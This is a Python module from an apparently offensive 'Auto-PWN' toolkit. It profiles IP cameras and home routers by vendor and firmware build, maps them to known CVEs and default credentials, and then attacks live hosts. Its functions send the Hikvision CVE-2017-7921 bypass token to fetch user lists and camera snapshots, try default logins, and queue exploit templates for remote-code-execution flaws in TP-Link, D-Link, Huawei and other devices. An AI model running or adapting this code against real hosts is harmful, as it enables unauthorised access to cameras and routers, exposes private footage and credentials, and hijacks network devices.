"""
Device CVE intelligence — cameras (Hikvision/Dahua) + routers (Netis/TP-Link/etc).
Maps firmware/build → known CVEs, probes live, runs targeted Nuclei templates.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

import requests

from engines.utils import log

# --- Hikvision firmware build thresholds (YYMMDD in build string) ---
HIKVISION_PATCHED_7921_BUILD = 170123  # V5.4.5 build 170123+ fixes CVE-2017-7921/7923
HIKVISION_CVE_36260_MIN_BUILD = 210625  # CVE-2021-36260 affects builds before ~210625

HIKVISION_CVES = (
    {
        "cve": "CVE-2017-7921",
        "title": "Hikvision auth bypass / config leak (admin:11)",
        "severity": "critical",
        "nuclei_templates": (
            "http/cves/2017/CVE-2017-7921.yaml",
            "http/vulnerabilities/hikvision/hikvision-info-leak.yaml",
        ),
        "nuclei_tags": "cve2017-7921,hikvision",
        "probe_path": "/Security/users?auth=YWRtaW46MTEK",
        "probe_ok_markers": ("userlist", "username"),
    },
    {
        "cve": "CVE-2017-7923",
        "title": "Hikvision privilege escalation",
        "severity": "high",
        "nuclei_templates": ("http/cves/2017/CVE-2017-7923.yaml",),
        "nuclei_tags": "cve2017-7923,hikvision",
        "probe_path": "/System/configurationFile?auth=YWRtaW46MTEK",
        "probe_ok_markers": (b"\x00", b"config", "<?xml"),
        "probe_is_binary": True,
    },
    {
        "cve": "CVE-2021-36260",
        "title": "Hikvision command injection (RCE)",
        "severity": "critical",
        "nuclei_templates": ("http/cves/2021/CVE-2021-36260.yaml",),
        "nuclei_tags": "cve2021-36260,hikvision,rce",
        "probe_path": None,
        "probe_ok_markers": (),
    },
)

ROUTER_CVES_BY_VENDOR: dict[str, tuple[dict, ...]] = {
    "NETIS": (
        {
            "cve": "NETIS-DEFAULT-CREDS",
            "title": "Netis default credentials (guest:guest / admin:admin)",
            "severity": "high",
            "nuclei_templates": (),
            "nuclei_tags": "default-login,netis",
            "attack": "form_login",
        },
        {
            "cve": "CVE-2014-8361",
            "title": "Miniigd UPnP stack command execution (some Netis models)",
            "severity": "critical",
            "nuclei_templates": ("http/cves/2014/CVE-2014-8361.yaml",),
            "nuclei_tags": "cve2014-8361,upnp,rce",
            "attack": "upnp",
        },
    ),
    "TPLINK": (
        {
            "cve": "CVE-2023-1389",
            "title": "TP-Link Archer AX21 command injection",
            "severity": "critical",
            "nuclei_templates": ("http/cves/2023/CVE-2023-1389.yaml",),
            "nuclei_tags": "cve2023-1389,tplink,rce",
        },
        {
            "cve": "CVE-2017-13772",
            "title": "TP-Link WR940N auth bypass",
            "severity": "high",
            "nuclei_templates": ("http/cves/2017/CVE-2017-13772.yaml",),
            "nuclei_tags": "cve2017-13772,tplink",
        },
        {
            "cve": "TPLINK-DEFAULT-LOGIN",
            "title": "TP-Link default web credentials",
            "severity": "medium",
            "nuclei_templates": (),
            "nuclei_tags": "default-login,tplink",
            "attack": "basic_auth",
        },
    ),
    "DLINK": (
        {
            "cve": "CVE-2019-17621",
            "title": "D-Link DIR unauthenticated RCE",
            "severity": "critical",
            "nuclei_templates": ("http/cves/2019/CVE-2019-17621.yaml",),
            "nuclei_tags": "cve2019-17621,dlink,rce",
        },
        {
            "cve": "CVE-2020-8958",
            "title": "D-Link DNS RCE",
            "severity": "critical",
            "nuclei_templates": ("http/cves/2020/CVE-2020-8958.yaml",),
            "nuclei_tags": "dlink,rce",
        },
    ),
    "MIKROTIK": (
        {
            "cve": "CVE-2018-14847",
            "title": "MikroTik Winbox directory traversal (credential leak)",
            "severity": "critical",
            "nuclei_templates": ("http/cves/2018/CVE-2018-14847.yaml",),
            "nuclei_tags": "cve2018-14847,mikrotik",
            "attack": "winbox",
        },
    ),
    "ZTE": (
        {
            "cve": "CVE-2017-18370",
            "title": "ZTE ZXV10 hardcoded telnet credentials",
            "severity": "high",
            "nuclei_templates": (),
            "nuclei_tags": "zte,default-login",
            "attack": "telnet",
        },
        {
            "cve": "ZTE-TR069",
            "title": "ZTE router TR-069 / web credential weaknesses",
            "severity": "medium",
            "nuclei_templates": (),
            "nuclei_tags": "zte,router",
            "attack": "basic_auth",
        },
    ),
    "OPENWRT": (
        {
            "cve": "OPENWRT-LUCI-BRUTE",
            "title": "OpenWrt/LuCI weak or default password",
            "severity": "medium",
            "nuclei_templates": (),
            "nuclei_tags": "openwrt,luci,default-login",
            "attack": "luci_form",
        },
    ),
    "CISCO": (
        {
            "cve": "CVE-2019-1652",
            "title": "Cisco RV320/RV325 command injection",
            "severity": "critical",
            "nuclei_templates": ("http/cves/2019/CVE-2019-1652.yaml",),
            "nuclei_tags": "cve2019-1652,cisco",
        },
    ),
    "UBIQUITI": (
        {
            "cve": "CVE-2021-41192",
            "title": "Ubiquiti UniFi information disclosure",
            "severity": "medium",
            "nuclei_templates": (),
            "nuclei_tags": "ubiquiti,unifi",
        },
    ),
    "GENERIC": (
        {
            "cve": "ROUTER-DEFAULT-LOGIN",
            "title": "Generic router default credentials",
            "severity": "medium",
            "nuclei_templates": (),
            "nuclei_tags": "default-login,router,iot",
            "attack": "basic_auth",
        },
        {
            "cve": "CVE-2017-17215",
            "title": "Huawei HG532 router port 37215 RCE (Mirai vector)",
            "severity": "critical",
            "nuclei_templates": ("http/cves/2017/CVE-2017-17215.yaml",),
            "nuclei_tags": "cve2017-17215,huawei,rce",
        },
    ),
}

# --- Load Dynamic CVEs ---
import os
import json
from engines.utils import log

_dynamic_cves_loaded = False
def load_dynamic_cves():
    global _dynamic_cves_loaded, ROUTER_CVES_BY_VENDOR
    if _dynamic_cves_loaded:
        return
    data_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "data")
    json_path = os.path.join(data_dir, "latest_cves.json")
    if os.path.exists(json_path):
        try:
            with open(json_path, 'r', encoding='utf-8') as f:
                dynamic_cves = json.load(f)
                count = 0
                for vendor, cve_list in dynamic_cves.items():
                    if vendor not in ROUTER_CVES_BY_VENDOR:
                        ROUTER_CVES_BY_VENDOR[vendor] = ()
                    # Merge while avoiding exact duplicates by CVE ID
                    existing_cves = {c["cve"] for c in ROUTER_CVES_BY_VENDOR[vendor]}
                    new_tuples = list(ROUTER_CVES_BY_VENDOR[vendor])
                    for cve in cve_list:
                        if cve["cve"] not in existing_cves:
                            new_tuples.append(cve)
                            count += 1
                    ROUTER_CVES_BY_VENDOR[vendor] = tuple(new_tuples)
            if count > 0:
                log(f"Loaded {count} dynamic CVEs from {json_path}", "INFO")
        except Exception as e:
            log(f"Failed to load dynamic CVEs: {e}", "ERROR")
    _dynamic_cves_loaded = True


@dataclass
class CveAssessment:
    cve_id: str
    title: str
    severity: str
    status: str  # TRY | SKIP_PATCHED | LIKELY_VULNERABLE | CONFIRMED | NOT_APPLICABLE
    reason: str
    nuclei_templates: list[str] = field(default_factory=list)
    nuclei_tags: str = ""
    attack_method: str = ""


@dataclass
class DeviceIntel:
    device_type: str
    model: str = ""
    firmware: str = ""
    firmware_build: int = 0
    serial: str = ""
    mac: str = ""
    assessments: list[CveAssessment] = field(default_factory=list)
    nuclei_templates: list[str] = field(default_factory=list)
    nuclei_tags: set[str] = field(default_factory=set)
    backdoor_works: bool | None = None

    def templates_to_run(self) -> list[str]:
        seen: set[str] = set()
        out: list[str] = []
        for t in self.nuclei_templates:
            if t not in seen:
                seen.add(t)
                out.append(t)
        return out

    def tags_string(self) -> str:
        return ",".join(sorted(self.nuclei_tags))


def _parse_firmware_build(firmware_released: str, firmware_version: str = "") -> int:
    """Extract YYMMDD build number from strings like 'build 170124' or 'V5.4.5'."""
    text = f"{firmware_released} {firmware_version}".lower()
    m = re.search(r"build\s*(\d{6})", text, re.I)
    if m:
        return int(m.group(1))
    m = re.search(r"(\d{6})\b", text)
    if m:
        val = int(m.group(1))
        if 100101 <= val <= 991231:
            return val
    return 0


def fetch_hikvision_device_info(host: str, port: int = 80, auth: tuple[str, str] | None = None) -> dict:
    """Pull ISAPI DeviceInfo — with optional Digest auth."""
    from engines.hikvision_snapshots import hikvision_digest_auth

    base = f"http://{host}" if port == 80 else f"http://{host}:{port}"
    session = requests.Session()
    session.verify = False
    session.headers["User-Agent"] = "Mozilla/5.0 Auto-PWN-CVE/1.0"
    url = f"{base}/ISAPI/System/deviceInfo"

    try:
        if auth:
            r = session.get(url, auth=hikvision_digest_auth(auth[0], auth[1]), timeout=10)
        else:
            r = session.get(url, auth=("admin", "11"), timeout=10)
            if r.status_code == 401:
                r = session.get(f"{url}?auth=YWRtaW46MTEK", timeout=10)
        if r.status_code != 200:
            return {}
        from engines.hikvision_snapshots import is_isapi_xml

        if not is_isapi_xml(r.content):
            return {}
        text = r.text
        info: dict[str, str] = {}
        for tag in ("model", "firmwareVersion", "firmwareReleasedDate", "deviceName", "serialNumber", "macAddress", "deviceType"):
            m = re.search(rf"<{tag}>([^<]+)</{tag}>", text, re.I)
            if m:
                info[tag] = m.group(1).strip()
        return info
    except requests.RequestException:
        return {}


def probe_hikvision_backdoor(host: str, port: int = 80) -> bool:
    """Live check if CVE-2017-7921 bypass still works."""
    base = f"http://{host}" if port == 80 else f"http://{host}:{port}"
    session = requests.Session()
    session.verify = False
    try:
        r = session.get(f"{base}/Security/users?auth=YWRtaW46MTEK", timeout=8)
        if r.status_code == 200 and "userlist" in r.text.lower():
            return True
        r2 = session.get(f"{base}/onvif-http/snapshot?auth=YWRtaW46MTEK", timeout=8)
        return r2.status_code == 200 and len(r2.content) > 1000
    except requests.RequestException:
        return False


def assess_hikvision(
    host: str,
    port: int = 80,
    model: str = "",
    firmware: str = "",
    firmware_build: int = 0,
    auth: tuple[str, str] | None = None,
) -> DeviceIntel:
    """Build CVE plan for Hikvision IP camera/NVR."""
    info = fetch_hikvision_device_info(host, port, auth)
    model = model or info.get("model", "")
    firmware = firmware or info.get("firmwareVersion", "")
    fw_date = info.get("firmwareReleasedDate", "")
    build = firmware_build or _parse_firmware_build(fw_date, firmware)

    intel = DeviceIntel(
        device_type="HIKVISION",
        model=model,
        firmware=f"{firmware} ({fw_date})".strip(" ()"),
        firmware_build=build,
        serial=info.get("serialNumber", ""),
        mac=info.get("macAddress", ""),
    )
    intel.backdoor_works = probe_hikvision_backdoor(host, port)

    for cve_def in HIKVISION_CVES:
        cve_id = cve_def["cve"]
        templates = list(cve_def.get("nuclei_templates", ()))
        tags = cve_def.get("nuclei_tags", "")
        attack = ""

        if cve_id == "CVE-2017-7921":
            if intel.backdoor_works:
                status, reason = "CONFIRMED", "Backdoor auth=YWRtaW46MTEK works (users/snapshot)"
            elif build >= HIKVISION_PATCHED_7921_BUILD:
                status, reason = "SKIP_PATCHED", f"Firmware build {build} >= {HIKVISION_PATCHED_7921_BUILD} (patched)"
            else:
                status, reason = "TRY", "Old firmware — test backdoor and Nuclei"
            attack = "backdoor_bypass"

        elif cve_id == "CVE-2017-7923":
            if build >= HIKVISION_PATCHED_7921_BUILD:
                status, reason = "SKIP_PATCHED", f"Patched with same fix line as CVE-2017-7921"
            else:
                status, reason = "TRY", "May allow privilege escalation on old firmware"

        elif cve_id == "CVE-2021-36260":
            if build and build < HIKVISION_CVE_36260_MIN_BUILD:
                status, reason = "NOT_APPLICABLE", f"Build {build} too old for this RCE chain (needs ~{HIKVISION_CVE_36260_MIN_BUILD}+)"
            elif build >= HIKVISION_CVE_36260_MIN_BUILD:
                status, reason = "LIKELY_VULNERABLE", f"Build {build} in range — run Nuclei RCE check"
            else:
                status, reason = "TRY", "Firmware build unknown — scan with Nuclei"

        else:
            status, reason = "TRY", "Manual verification recommended"

        assessment = CveAssessment(
            cve_id=cve_id,
            title=cve_def["title"],
            severity=cve_def["severity"],
            status=status,
            reason=reason,
            nuclei_templates=templates if status in ("TRY", "LIKELY_VULNERABLE", "CONFIRMED") else [],
            nuclei_tags=tags,
            attack_method=attack,
        )
        intel.assessments.append(assessment)
        if assessment.nuclei_templates:
            intel.nuclei_templates.extend(assessment.nuclei_templates)
        if tags:
            intel.nuclei_tags.update(tags.split(","))

    intel.nuclei_tags.update(("hikvision", "cve", "iot"))
    return intel


def assess_router(device_type: str, model: str = "", server_banner: str = "") -> DeviceIntel:
    """Build CVE plan for router/gateway."""
    load_dynamic_cves()
    vendor = device_type if device_type in ROUTER_CVES_BY_VENDOR else "GENERIC"
    cves = ROUTER_CVES_BY_VENDOR.get(vendor, ROUTER_CVES_BY_VENDOR["GENERIC"])

    intel = DeviceIntel(device_type=device_type or "UNKNOWN", model=model)
    intel.firmware = server_banner

    for cve_def in cves:
        cve_id = cve_def["cve"]
        attack = cve_def.get("attack", "nuclei")
        status = "TRY"
        reason = f"Run {attack} + Nuclei tags"

        if cve_id == "NETIS-DEFAULT-CREDS" and vendor == "NETIS":
            reason = "POST login.cgi — guest:guest / admin lists (Router Scan)"
            attack = "form_login"

        assessment = CveAssessment(
            cve_id=cve_id,
            title=cve_def["title"],
            severity=cve_def["severity"],
            status=status,
            reason=reason,
            nuclei_templates=list(cve_def.get("nuclei_templates", ())),
            nuclei_tags=cve_def.get("nuclei_tags", ""),
            attack_method=attack,
        )
        intel.assessments.append(assessment)
        if assessment.nuclei_templates:
            intel.nuclei_templates.extend(assessment.nuclei_templates)
        if assessment.nuclei_tags:
            intel.nuclei_tags.update(assessment.nuclei_tags.split(","))

    intel.nuclei_tags.update(("router", "cve", "iot", "default-login"))
    if vendor != "GENERIC":
        intel.nuclei_tags.add(vendor.lower())
    return intel


def _netis_detect(host: str, port: int = 80) -> bool:
    base = f"http://{host}" if port == 80 else f"http://{host}:{port}"
    try:
        r = requests.get(f"{base}/login.htm", timeout=8, verify=False)
        t = r.text.lower()
        return r.status_code == 200 and "login.cgi" in t and ("netis" in t or "adsl router login" in t)
    except requests.RequestException:
        return False


def _probe_hikvision_login_page(host: str, port: int = 80) -> bool:
    base = f"http://{host}" if port == 80 else f"http://{host}:{port}"
    try:
        r = requests.get(f"{base}/doc/page/login.asp", timeout=8, verify=False)
        text = r.text.lower()
        return r.status_code == 200 and any(
            x in text for x in ("hikvision", "web components", "logincontroller", "ng-controller")
        )
    except requests.RequestException:
        return False


def assess_device(
    host: str,
    port: int,
    device_type: str,
    model: str = "",
    server: str = "",
    auth: tuple[str, str] | None = None,
) -> DeviceIntel:
    """Unified entry: camera or router CVE intelligence."""
    is_hik = device_type == "HIKVISION"
    if not is_hik and device_type == "UNKNOWN":
        is_hik = _probe_hikvision_login_page(host, port) or probe_hikvision_backdoor(host, port)
    if is_hik:
        return assess_hikvision(host, port, model=model, auth=auth)

    if device_type in ROUTER_CVES_BY_VENDOR or device_type == "UNKNOWN":
        vendor = device_type if device_type != "UNKNOWN" else "GENERIC"
        if device_type == "UNKNOWN" and _netis_detect(host, port):
            vendor = "NETIS"
        return assess_router(vendor, model, server)

    if device_type == "DAHUA":
        intel = DeviceIntel(device_type="DAHUA", model=model)
        intel.nuclei_tags.update(("dahua", "cve", "iot", "default-login"))
        intel.nuclei_templates.extend((
            "http/vulnerabilities/dahua/dahua-weak-credentials.yaml",
        ))
        intel.assessments.append(CveAssessment(
            cve_id="DAHUA-DEFAULT",
            title="Dahua weak/default credentials",
            severity="high",
            status="TRY",
            reason="Ingram + default cred scan",
            nuclei_tags="dahua,default-login",
            attack_method="ingram",
        ))
        return intel

    return assess_router("GENERIC", model, server)


def print_cve_report(intel: DeviceIntel) -> None:
    """Router Scan style CVE summary to console."""
    print("\n" + "=" * 62)
    print("  CVE INTELLIGENCE REPORT")
    print("=" * 62)
    print(f"  Device        : {intel.device_type}")
    if intel.model:
        print(f"  Model         : {intel.model}")
    if intel.firmware:
        print(f"  Firmware      : {intel.firmware}")
    if intel.firmware_build:
        print(f"  Build         : {intel.firmware_build}")
    if intel.backdoor_works is not None:
        print(f"  Backdoor 7921 : {'OPEN' if intel.backdoor_works else 'PATCHED/CLOSED'}")
    print("-" * 62)
    for a in intel.assessments:
        mark = {
            "CONFIRMED": "[+]",
            "LIKELY_VULNERABLE": "[!]",
            "TRY": "[?]",
            "SKIP_PATCHED": "[-]",
            "NOT_APPLICABLE": "[ ]",
        }.get(a.status, "[?]")
        print(f"  {mark} {a.cve_id:<22} {a.status:<18} {a.severity}")
        print(f"      {a.title}")
        print(f"      -> {a.reason}")
        if a.attack_method:
            print(f"      Attack: {a.attack_method}")
    if intel.nuclei_templates:
        print("-" * 62)
        print(f"  Nuclei templates ({len(intel.templates_to_run())}):")
        for t in intel.templates_to_run()[:8]:
            print(f"    - {t}")
        if len(intel.templates_to_run()) > 8:
            print(f"    ... +{len(intel.templates_to_run()) - 8} more")
    print("=" * 62 + "\n")


def run_targeted_nuclei(scanner, target_url: str, intel: DeviceIntel) -> list:
    """Run Nuclei on CVE-specific templates then tag sweep."""
    findings: list = []
    templates = intel.templates_to_run()

    if templates:
        log(f"CVE-targeted Nuclei: {len(templates)} template(s)...", "INFO")
        for tpl in templates:
            hit = scanner.scan_specific_template(target_url, tpl)
            if hit:
                findings.append(hit)

    tags = intel.tags_string()
    if tags:
        log(f"CVE tag sweep: {tags}", "INFO")
        findings.extend(scanner.scan_tags(target_url, tags))

    return findings
